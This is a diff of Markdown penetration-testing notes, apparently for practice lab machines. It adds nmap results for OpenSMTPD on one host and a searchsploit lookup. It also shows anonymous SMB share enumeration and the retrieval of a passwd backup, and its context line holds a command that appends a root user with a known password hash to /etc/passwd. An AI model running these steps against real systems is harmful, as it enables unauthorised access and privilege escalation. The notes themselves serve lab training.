@@ -197,15 +197,22 @@ echo 'owned:$1$password$Da2mWXlxe6J7jtww12SNG/:0:0:owned:/root:/bin/bash' >> /et
 ```shell
 # port scan
 sudo nmap -sC -sV -Pn -p- 192.168.207.71 -oN 207.71_allport
+25/tcp  open   smtp        OpenSMTPD
+| smtp-commands: bratarina Hello nmap.scanme.org [192.168.45.185], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP
+|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
 445/tcp open   netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: COFFEECORP)
 
-# smb
+# smb - 레빗홀
 crackmapexec smb 192.168.207.71 -u '' -p '' --shares
 crackmapexec smb 192.168.207.71 -u '' -p '' --spider backups --regex .
 SMB         192.168.207.71  445    BRATARINA        //192.168.207.71/backups/passwd.bak [lastm:'2020-07-06 16:46' size:1747]
 
 smbclient //192.168.207.71/backups
 get passwd.bak
+
+# smtp
+searchsploit OpenSMTPD
+
 ```
 ### Pebbles
 ```shell
